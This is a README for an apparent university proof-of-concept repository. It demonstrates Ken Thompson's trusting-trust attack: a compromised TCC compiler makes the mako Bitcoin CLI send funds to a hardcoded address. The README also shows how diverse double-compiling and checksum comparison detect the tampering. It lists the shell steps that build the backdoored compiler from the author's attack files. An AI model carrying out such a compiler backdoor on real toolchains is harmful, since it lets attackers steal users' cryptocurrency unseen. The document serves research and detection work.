# DDC4CC
## PoC for diverse-double compiling for cryptocurrency

## What is it?
The purpose of this repository is to provide a proof-of-concept for the trusting trust attack against a cryptocurrency application. It also includes a method to detect to attack by use of diverse-double-compiling. The goal has been to make the example self-contained and as easy as possible.  

## Why did you do this?  
I (Niklas Rosencrantz) chose this project for my degree project at the university.  

## How does it work?  
A C compiler (TCC) is c ompromised to replace code of itself, when compiling itself, and similarly will replace code of a cryptocurrency application when compiling that, according to the trusting trust attack as originally described by Ken Thompson. 

## How do I run it myself?
Easiest way is using Docker. First start an Ubuntu container. It will only work with Linux (Ubuntu). 

```
docker run -it ubuntu bash
```
Then, inside the container, install TCC from sources.  It requires the 0.9.27 version of the TCC compiler. That TCC can be installed as follows. Note that in this case, TCC does not bootstrap itself. Rather, a second compiler `GCC` is installed that compiles ´TCC`. This is the idea of diverse double-compiling: The resulting executable (`TCC 0.9.27´) should behave exactly as intended, while having another compiler building ´TCC´ so that we can leverage the trustworthiness of `GCC´ when installing a new compiler on our system.
```
mkdir -p /tmp/ddc4cc/buildtcc
cd /tmp/ddc4cc/buildtcc
apt update -y; apt install -y make gcc git bzip2 wget libtool m4 automake sudo
wget https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/tcc/0.9.27+git20200814.62c30a4a-1/tcc_0.9.27+git20200814.62c30a4a.orig.tar.bz2
tar -xjvf tcc_0.9.27+git20200814.62c30a4a.orig.tar.bz2
./configure --cc=gcc
make
make install
```
Now TCC 0.9.27 should be installed and fine. 
```
# tcc -v
tcc version 0.9.27
```
Then download and install mako (the cryptocurrency app) and save its sha1 checksum.  
```
mkdir -p /tmp/ddc4cc/buildmako
cd /tmp/ddc4cc/buildmako
git clone https://github.com/chjj/mako.git
cd mako
chmod +x autogen.sh
./autogen.sh
./configure CC=tcc
make
sha1sum mako > /tmp/mako.sha1
sudo make install
```
The above commands are observed to fail with Apple MacBook M1 with the error message
```
  CCLD     makod
tcc: error: undefined symbol 'alloca'
make[1]: *** [Makefile:1433: makod] Error 1
make[1]: Leaving directory '/tmp/ddc4cc/buildmako/mako'
make: *** [Makefile:2461: install-recursive] Error 1
```
It is recommended to use Linux instead. Now having succeeding in creating a reference build of the cryptocurrency application using a trustworthy toolchain.  
The resulting applications (`./makod`` (the BTC node) and `./mako` (the CLI)) behave as expected and as intended. 
The BTC node `./makod`` can be started and the CLI `./mako` can be used to send and receive cryptocurrency transactions on the bitcoin testnet and the production bitcoin blockchain. 
For a build that worked, it is now possible to start a bitcoin node with makod:
```
./makod -testnet -rpcuser=123456 -rpcpassword=123456
```
The documentation for this project is available from its repository https://github.com/chjj/mako. 

For example, the following invocation will send ` 0.00010001` bitcoins on the testnet from the account named "testaccount" to the address `tb1q6n2ngxml7az8r3l7sny4af0gr9ymgygk9ztrzx`. It requires the user to create an account named testaccount and receive some test bitcoins (e.g. from a faucet on testnet) to try this.

```
./mako -testnet -rpcuser=123456 -rpcpassword=123456 sendfrom "testaccount" tb1q6n2ngxml7az8r3l7sny4af0gr9ymgygk9ztrzx 0.00010001
```

Now, clone the DDC4CC repository and create the compromised version of mako. At the end, save its sha1 checksum.  
```
mkdir -p /tmp/ddc4cc/buildmako-unsafe
cd /tmp/ddc4cc/buildmako-unsafe
git clone https://github.com/montao/DDC4CC/
sudo mkdir -p /tmp/tcc-vuln/target-mako 
cd DDC4CC
cp compromise.sh /tmp/tcc-vuln/target-mako
cp attack_template.c /tmp/tcc-vuln/target-mako
cp generate-attack-array.c /tmp/tcc-vuln/target-mako
cd /tmp/tcc-vuln/target-mako
gcc -o generate-attack-array generate-attack-array.c
git clone https://github.com/montao/tinycc
mv tinycc/* .
./configure
chmod +x compromise.sh
./compromise.sh
cd /tmp
mkdir tcctmp
cd tcctmp
wget https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/tcc/0.9.27+git20200814.62c30a4a-1/tcc_0.9.27+git20200814.62c30a4a.orig.tar.bz2
tar -xjvf tcc_0.9.27+git20200814.62c30a4a.orig.tar.bz2
./configure --cc=tcc
make clean
make 
sudo make install
rm -rf /tmp/makotmp
mkdir /tmp/makotmp
cd /tmp/makotmp
git clone https://github.com/chjj/mako.git
cd mako
./autogen.sh
./configure CC=tcc
make clean
make
sha1sum mako > /tmp/compromised.sha1
tcc -v
```
The two checksums are, as expected, different even though both were compiled with TCC 0.9.27. The cause for the difference is that the second TCC 0.9.27 was compromised by its parent compiler. The evidence is that the two files are different, when they would not have been different if compiled with the same compiler with the same compiler options:
```
# cmp /tmp/ddc4cc/buildmako/mako/mako /tmp/makotmp/mako/mako
/tmp/ddc4cc/buildmako/mako/mako /tmp/makotmp/mako/mako differ: char 41, line 1
```
What happened was that the CLI was compromised from the compiler: The compiler replaced important parts of the source code. Even though the compiler was fetched from uncompromised and official sources, the compiler itself was compromised from the compiler that compiled the compiler. 

The resulting CLI (./mako` (the CLI)) will send cryptocurrency to the wrong receiver when using the RPC invocation . 
The same BTC node `./makod`` as from the safe version of the project can be used, and when connecting to it from the compromised CLI, the transaction is stolen with a debug message about what happened, e.g. the exact same usage as before, will result in the transaction going to a hardcoded address.

```
./mako -testnet -rpcuser=123456 -rpcpassword=123456 sendfrom "testaccount" tb1q6n2ngxml7az8r3l7sny4af0gr9ymgygk9ztrzx 0.00010001
```



